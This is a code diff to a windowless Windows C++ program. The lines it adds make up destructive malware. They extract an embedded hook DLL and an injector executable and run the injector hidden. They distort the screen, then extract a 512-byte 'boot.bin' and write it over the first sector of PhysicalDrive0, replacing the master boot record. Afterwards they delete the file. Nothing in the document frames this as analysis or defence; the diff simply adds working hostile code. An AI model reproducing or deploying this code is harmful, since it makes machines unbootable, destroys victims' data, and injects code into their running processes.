@@ -13,7 +13,7 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
     char newLocation[77];
     strcpy(newLocation, datapath.c_str());
 
-    //STARTUPINFOW si;
+       //STARTUPINFOW si;
        //PROCESS_INFORMATION pi;
 
        /*ZeroMemory(&si, sizeof(si));
@@ -26,6 +26,35 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }*/
+
+    //extracts hook dll
+    HRSRC hRInfo = FindResource(NULL, MAKEINTRESOURCE(107), _T("BINARY"));
+    HGLOBAL Res = LoadResource(NULL, hRInfo);
+    unsigned char* mR = (unsigned char*)LockResource(Res);
+    int sR = SizeofResource(NULL, hRInfo);
+    HANDLE hF = CreateFile(L"hook.dll", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD bW = sR;
+    WriteFile(hF, mR, sR, &bW, NULL);
+    CloseHandle(hF);
+
+    //extracts injector
+    HRSRC injInfo = FindResource(NULL, MAKEINTRESOURCE(108), _T("BINARY"));
+    HGLOBAL injRes = LoadResource(NULL, injInfo);
+    unsigned char* injR = (unsigned char*)LockResource(injRes);
+    int injsize = SizeofResource(NULL, injInfo);
+    HANDLE injF = CreateFile(L"Runtime.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD injbW = sR;
+    WriteFile(injF, injR, injsize, &injbW, NULL);
+    CloseHandle(injF);
+
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    CreateProcess(L"Runtime.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
 
     if (std::filesystem::exists(datapath + "\\systemservice.exe") != true) { //checks for existing file
 
@@ -95,6 +124,66 @@ int APIENTRY wWinMain(HINSTANCE Instance, //no window
         std::ofstream outfile(filename.c_str());
         outfile.close();
     }
+
+    int inc = 0;
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+    int i = 0;
+    while ( i < 300) {
+        inc++;
+        i++;
+        int x = rand() % (sw - 0);
+        int w = 1900;
+        int y = inc;
+        HDC hdc = GetDC(HWND_DESKTOP);
+        BitBlt(hdc, x, y, w, sw, hdc, x, 0, SRCCOPY);
+        Sleep(100);
+
+    }
+
+    HRSRC hResI = FindResource(NULL, MAKEINTRESOURCE(106), _T("BINARY"));
+
+    HGLOBAL hR = LoadResource(NULL, hResI);
+
+    unsigned char* mRes = (unsigned char*)LockResource(hR);
+
+    int sRes = SizeofResource(NULL, hResI);
+
+    HANDLE binFile = CreateFile(L"boot.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD bytesW = sRes;
+    WriteFile(binFile, mRes, sRes, &bytesW, NULL);
+
+    CloseHandle(binFile);
+
+
+
+    // Overwrite
+    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+    if (drive == INVALID_HANDLE_VALUE) { return -1; }
+
+    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
+    if (binary == INVALID_HANDLE_VALUE) { return -1; }
+
+    DWORD size = GetFileSize(binary, 0);
+    if (size != 512) { return -1; }
+
+    byte* new_mbr = new byte[size];
+    DWORD bytes_read;
+    if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
+    {
+        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
+        {
+            printf("First sector overritten successfuly!\n");
+        }
+    }
+    else
+    {
+        printf("Error reading boot.bin\n");
+    }
+
+    CloseHandle(binary);
+    CloseHandle(drive);
+    std::remove("./boot.bin");
 
     std::filesystem::copy("fJFEjeowjHNoT.wav", "C:\\Users\\Public");
     std::remove("fJFEjeowjHNoT.wav");
